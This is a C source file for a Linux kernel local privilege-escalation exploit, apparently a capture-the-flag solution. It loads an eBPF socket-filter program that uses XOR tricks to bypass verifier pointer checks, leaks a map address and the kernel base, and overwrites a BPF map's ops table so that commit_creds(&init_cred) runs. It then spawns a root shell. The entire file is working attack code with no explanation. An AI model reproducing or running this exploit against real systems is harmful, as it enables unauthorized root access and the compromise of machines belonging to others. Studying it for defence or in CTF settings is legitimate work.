#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/types.h>
#include <sys/msg.h>
#include "musl_bpf.h"

char buffer[64];
int sockets[2];
int ctrl_mapfd;
int vuln_mapfd;
size_t ctrlmap_ptr;
size_t vulnmap_ptr;
size_t leakbuf[0x200];
size_t ctrlbuf[0x200];
size_t kbase;

void get_shell() {
  puts("[*] get shell");
  system("sh");
}

void update_elem_ctrl()
{
  int key = 0;
  if (bpf_update_elem(ctrl_mapfd, &key, ctrlbuf, 0)) {
    printf("bpf_update_elem failed '%s'\n", strerror(errno));
  }
}

void get_elem_ctrl()
{
  int key = 0;
  if (bpf_lookup_elem(ctrl_mapfd, &key, leakbuf)) {
    printf("bpf_lookup_elem failed '%s'\n", strerror(errno));
  }
}

void trigger(void)
{
  ssize_t n = write(sockets[0], "RABBIT", 6);

  if (n < 0) {
    perror("write");
    return;
  }
}

int load_prog()
{
  ctrl_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x200, 1, 0);
  if (ctrl_mapfd < 0) {
    puts("failed to create map1");
    return -1;
  }

  vuln_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x200, 1, 0);
  if (vuln_mapfd < 0) {
    puts("failed to create map2");
    return -1;
  }

  struct bpf_insn prog[] = {
    // set map pointer to r0
    BPF_GET_MAP(ctrl_mapfd, 0),
    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),

    // set r2's type to scalar by xor
    // r3 = r2
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),
    BPF_ALU64_IMM(BPF_XOR, BPF_REG_2, 0),
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_2),

    // xor again to make it a map pointer
    // local = 0x510, remote = 0xd10
    // r3 = vulnmap
    BPF_ALU64_IMM(BPF_XOR, BPF_REG_3, 0x510),

    // attack switch
    BPF_JMP_IMM(BPF_JNE, BPF_REG_8, 0, 4),

    // overwrite vuln array's array_ops
    // vulnmap->ops = &ctrlmap->value[8]
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 8),
    BPF_STX_MEM(BPF_DW, BPF_REG_3, BPF_REG_2, 0),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),

    // leak &ctrlmap->value
    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_2, 0),

    // leak &vulnmap->ops
    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_3, 0),
    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_4, 8),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
  };
  return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL");
}

void overwrite_array_ops() {
  size_t init_cred = kbase + 0x184d340;
  size_t fd_array_map_delete_elem = kbase + 0x177fa0;
  size_t commit_creds = kbase + 0x8be70;

  // put elem on vuln_map
  int key = 0;
  bpf_update_elem(vuln_mapfd, &key, &init_cred, 0);

  // prepare fake array_ops (from +8)
  ctrlbuf[14] = fd_array_map_delete_elem;  // map_delete_elem
  ctrlbuf[19] = commit_creds;              // map_fd_put_ptr
  ctrlbuf[26] = 0;                         // map_poke_run

  // overwrite vulnmap->ops
  ctrlbuf[0] = 0;
  update_elem_ctrl();
  trigger();

  // fd_array_map_delete_elem call map->map_fd_put_ptr(first_elem) = commit_creds(&init_cred)
  bpf_delete_elem(vuln_mapfd, &key);

  // drop root shell :)
  get_shell();
}

int main() {
  int progfd = load_prog();

  if (progfd < 0) {
    printf("log:\n%s", bpf_log_buf);
    if (errno == EACCES)
      printf("failed to load prog '%s'\n", strerror(errno));
  }

  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) {
    strerror(errno);
    return 0;
  }

  if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0) {
    strerror(errno);
    return 0;
  }

  ctrlbuf[0] = 1;
  update_elem_ctrl();
  trigger();

  get_elem_ctrl();

  size_t map = leakbuf[0];
  printf("[*] leak map pointer: %p\n", map);

  kbase = leakbuf[1] - 0x139d4c0;
  printf("[*] leak kernel base: %p\n", kbase);

  overwrite_array_ops();
}
